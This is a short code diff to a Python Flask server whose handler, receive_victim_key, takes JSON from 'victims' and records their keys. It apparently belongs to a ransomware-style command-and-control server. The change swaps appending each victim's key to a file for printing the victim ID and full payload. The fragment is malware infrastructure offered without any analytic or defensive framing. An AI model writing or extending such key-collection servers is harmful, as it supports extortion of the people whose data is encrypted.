@@ -9,12 +9,9 @@ app = Flask(__name__)
 def receive_victim_key():
     data = request.json
     
-    # open file and append the data
-    file = open('victims_keys.json', 'a')
-    file.write(json.dumps(data) + '\n')
-    file.close()
-    
-    print("Got a key from victim:", data['victim_id'])
+    print("Got a key from victim")
+    print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
+    print(f"JSON payload: {json.dumps(data)}\n")
     
     return jsonify({"status": "success"}), 200
 
